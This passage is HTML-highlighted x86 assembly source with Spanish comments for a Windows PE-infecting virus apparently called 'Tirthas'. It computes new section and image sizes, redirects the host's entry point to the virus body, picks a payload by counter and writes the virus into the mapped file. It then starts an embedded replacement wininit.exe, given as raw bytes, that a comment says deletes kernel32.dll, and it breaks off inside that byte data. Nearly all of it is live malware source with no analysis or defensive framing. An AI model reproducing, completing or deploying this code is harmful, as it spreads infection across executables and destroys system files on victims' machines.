      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Virtual_size_LS</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc5">Tirthas_size</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">;Nuevo Virtual size.</span><span class="sc0">

      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">38h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Section_alignment</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">                 </span><span class="sc1">;EDI= File alignment.</span><span class="sc0">
      </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;Nuevo Size Of Raw Data.</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Tirthas_size</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
      </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Section_alignment</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
      </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">mul</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">50h</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">;Nuevo Size of Image.</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; NUEVO ENTRY POINT</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Virtual_address_LS</span><span class="sc4">]</span><span class="sc0">     </span><span class="sc1">;rva...</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Virtual_size_LS</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                                 </span><span class="sc1">;ESI= Entry Point</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">New_entry_point</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Address_PEheader</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Old_entry_point</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">+</span><span class="sc2">28h</span><span class="sc4">],</span><span class="sc8">esi</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; SELECCION DE PAYLOAD</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Numero_payload</span><span class="sc4">],</span><span class="sc2">2</span><span class="sc0">
      </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Meter_inc</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Numero_payload</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Infection_file</span><span class="sc0">

 </span><span class="sc5">Meter_inc</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Numero_payload</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; INFECCION DEL ARCHIVO</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------     </span><span class="sc0">

 </span><span class="sc5">Infection_file</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc5">Tirthas_size</span><span class="sc0">
      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Pointer_to_raw_data_LS</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Virtual_size_LS</span><span class="sc4">]</span><span class="sc0">      
      </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_fichero</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Tirthas_start</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; CIERRE DEL ARCHIVO INFECTADO</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

 </span><span class="sc5">Close_mapping</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Base_fichero</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_UnmapViewOfFile</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">Close_filemapping</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_createfilemap</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CloseHandle</span><span class="sc4">]</span><span class="sc0">

 </span><span class="sc5">Close_file</span><span class="sc4">:</span><span class="sc0">

      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Handle_createfile</span><span class="sc4">]</span><span class="sc0">
      </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
      </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">A_CloseHandle</span><span class="sc4">]</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_open_kernel</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">New_Wininit</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_numero</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Standar_open</span><span class="sc0">

      </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_infection_by_fuction</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
      </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">Return_to_fuction</span><span class="sc0">

      </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next_files</span><span class="sc0">

 </span><span class="sc5">Next_step</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_open_kernel</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">New_Wininit</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">Next_files</span><span class="sc0">

 </span><span class="sc5">Next_step_1</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Flag_infection_by_fuction</span><span class="sc4">],</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Next_step</span><span class="sc0">

 </span><span class="sc5">Return_to_fuction</span><span class="sc4">:</span><span class="sc0">

       </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Return_address_in_virus</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">

      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; NUEVO WININIT.EXE</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">
      </span><span class="sc1">; Se encarga de eliminar el kernel32.dll antes de ser cargado.</span><span class="sc0">
      </span><span class="sc1">;----------------------------------------------------------------------</span><span class="sc0">

      </span><span class="sc5">New_wininit_start</span><span class="sc0">   </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">

      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">4dh</span><span class="sc4">,</span><span class="sc2">5ah</span><span class="sc4">,</span><span class="sc2">59h</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc4">,</span><span class="sc2">2h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">20h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">3eh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0fbh</span><span class="sc4">,</span><span class="sc2">71h</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">6ah</span><span class="sc4">,</span><span class="sc2">72h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">1h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
